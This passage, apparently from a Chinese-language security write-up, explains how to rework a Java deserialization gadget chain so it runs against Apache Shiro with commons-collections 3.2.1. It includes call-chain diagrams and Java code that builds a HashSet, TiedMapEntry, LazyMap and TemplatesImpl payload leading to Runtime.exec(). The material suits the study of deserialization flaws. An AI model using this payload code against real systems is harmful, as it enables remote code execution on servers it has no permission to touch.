No.3

改造Gadget

思考几个东西：
1.要选择兼容JDK版本的gadget。
2.最先开始知道是采用commons-collections:4.0作为gadget，但是shiro自带的commons-collections:3.2.1，所以需要进行改造。如果想让tomcat+shiro这个环境下本地命令执行，需要满足利用链上没有出现数组类型的对象。
基于上述原因开始改造计划，首先先回顾一下commons-collections:4.0这个利用链。

   ObjectInputStream.readObject()
           PriorityQueue.readObject()
               ...
                   TransformingComparator.compare()
                       InvokerTransformer.transform()
                           Method.invoke()
                               Runtime.exec()

本质原因在于commons-collections2这个利用链中 TransformingComparator 实现了 Serializable 序列化接口，也就是说这个对象是被序列化的。

 而我们再看看commons-collections5这个利用链，这里用的 ChainedTransformer 。 

ObjectInputStream.readObject()         BadAttributeValueExpException.readObject()
               TiedMapEntry.toString()
                   LazyMap.get()
                       ChainedTransformer.transform()
                           ConstantTransformer.transform()
                           InvokerTransformer.transform()
                               Method.invoke()
                                   Class.getMethod()
                           InvokerTransformer.transform()
                               Method.invoke()
                                   Runtime.getRuntime()
                           InvokerTransformer.transform()
                               Method.invoke()
                                   Runtime.exec()

而 ChainedTransformer 他的 iTransformers 是数组类型 Transformers ，不符合我们的要求。 

也就是说这里需要做个组合，反正目的很清楚，需要从InvokerTransformer.transform()->TemplatesImpl.newTransformer()，然后利用 TemplatesImpl.newTransformer 中的 loadClass 来动态加载我们的恶意class。
关注一下这里，首先传入 Object 对象，通过 getMethod 处理 iMethodName ，假设这里的 iMethodName 是 newTransformer 。那么经过下面的反射处理，是可以到 TemplatesImpl.newTransformer 中。

当然从commons-collections5开始，出现了一种叫做TiedMapEntry的利用方法，使用 LazyMap.get()函数，所以这里实际上 Key 和 map 都是可控的。 

LazyMap.get调用了transform函数，并将可控的key传入transform函数。

 所以整理一下前面的过程，假设我们把构造好的 key：TemplatesImpl 作为 InvokerTransformer.transform() 的 input 传入，这时候利用链就可以穿起来了。

java.util.HashSet.readObject()
-> java.util.HashMap.put()
-> java.util.HashMap.hash()
   -> org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
   -> org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
       -> org.apache.commons.collections.map.LazyMap.get()
       -> org.apache.commons.collections.functors.InvokerTransformer.transform()
           -> java.lang.reflect.Method.invoke()
     ... templates gadgets ...
     -> java.lang.Runtime.exec()
//参考CC2生成恶意的TemplatesImpl
final Object templates = Gadgets.createTemplatesImpl(command);  
//构造InvokerTransformer，使用无害toString函数。
final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);    
final Map innerMap = new HashMap();
// 构造LazyMap的factory为前面的InvokerTransformer
final Map lazyMap = LazyMap.decorate(innerMap, transformer);
// 填充TiedMapEntry的map（lazyMap）和key（TemplatesImpl）
TiedMapEntry entry = new TiedMapEntry(lazyMap, templates);
HashSet map = new HashSet(1);
map.add("foo");
// 下述代码将entry填充到HashSet的node的key上，可以使得HashSet在put的时候调用TiedMapEntry的hashCode函数
Field f = null;
try {
 f = HashSet.class.getDeclaredField("map");
} catch (NoSuchFieldException e) {
 f = HashSet.class.getDeclaredField("backingMap");
}
Reflections.setAccessible(f);
HashMap innimpl = null;
innimpl = (HashMap) f.get(map);
Field f2 = null;
try {
 f2 = HashMap.class.getDeclaredField("table");
} catch (NoSuchFieldException e) {
 f2 = HashMap.class.getDeclaredField("elementData");
}
Reflections.setAccessible(f2);
Object[] array = new Object[0];
array = (Object[]) f2.get(innimpl);
Object node = array[0];
if(node == null){
 node = array[1];
}
Field keyField = null;
try{
 keyField = node.getClass().getDeclaredField("key");
}catch(Exception e){
 keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
}
Reflections.setAccessible(keyField);
keyField.set(node, entry);
// 将最终的触发函数newTransformer装载到InvokerTransformer上
Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
return map;
